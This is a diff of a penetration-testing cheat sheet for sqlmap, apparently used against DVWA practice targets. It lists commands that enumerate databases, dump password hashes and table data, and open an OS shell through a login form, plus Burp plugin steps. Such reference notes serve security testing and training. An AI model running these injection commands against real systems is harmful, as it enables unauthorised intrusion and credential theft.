@@ -60,35 +60,41 @@ sqlmap
 -b                 Retrieve DBMS banner.
 --passwords        Enumerate DBMS users password hashes.
 --crawl=#          Crawl the website starting from the target URL.
---forms            Parse and test forms on target URL.
 
-sqlmap.py -u 'http://www.target.com' --random-agent --dbms=MSSQL --level=3 --risk=3 -b --passwords --crawl=10 --forms
+sqlmap.py -u 'http://www.target.com' --random-agent --dbms=MSSQL --level=3 --risk=3 -b --passwords --crawl=10
 ------------------------------------------------------------------------------------------------------
 
-Use Burp to trap a request. Copy the request to /root/tmp.
+# Use Burp to trap a request. Copy the request to /root/tmp.
 
-sqlmap.py -r /root/tmp --banner                                              Show webserver OS, apps and db
-sqlmap.py -r /root/tmp --dbms=<db type> --dbs                                Show all dbs available
-sqlmap.py -r /root/tmp --dbms=<db type> -p <parameter> --current-user        Show the user the web server is using to talk to the db
-sqlmap.py -r /root/tmp --dbms=<db type> -p <parameter> -U <user> --passwords
-sqlmap.py -r /root/tmp --dbms=<db type> -D <database> --tables               Show all tables in a db
-sqlmap.py -r /root/tmp --dbms=<db type> -D <database> -T <table> --columns   Show all columns in a table
-sqlmap.py -r /root/tmp --dbms=<db type> -D <database> -T <table> --dump      Show all data in a table     
+sqlmap.py -r /root/tmp --hostname -b --current-db --dbs
 
-Example
-sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#'
---cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee"
-
-sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' 
---cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" --dbs
-
-sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' 
---cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D dvwa --tables
+# Using a cookie
 
 sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#'
---cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D dvwa -T users --columns
+--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" --hostname -b --current-db --dbs
 
 sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' 
---cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D dvwa -T users -C user_id,user,password --dump
+--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D <db name> --tables
+
+sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#'
+--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D <db name> -T <table name> --columns
+
+sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' 
+--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D <db name> -T <table name> -C <column
+1,2,3,4> --dump
 
 sqlmap.py -u 'http://target.com/login.asp' --data="txtLoginID=shrikant&txtPassword=password&cmdSubmit=Login" --os-shell
+------------------------------------------------------------------------------------------------------
+
+# Use CO2 plugin with Burp
+
+Burp > Proxy > turn Intercept on
+Browse to target URL > RC on the request > Send to SQLMapper
+Detection tab: set Level and Risk to 3.
+Enumeration: 
+1. hostname, banner, current db, databases > Run
+2. current user, is dba, users, passwords > Run
+3. Pin to Database <db name>, tables > Run
+4. Pin to Database <db name>, Pin to Table <table name>, columns > Run
+5. Pin to Database <db name>, Pin to Table <table name>, Pin to Column <column 1,2,3,4> dump > Run
+
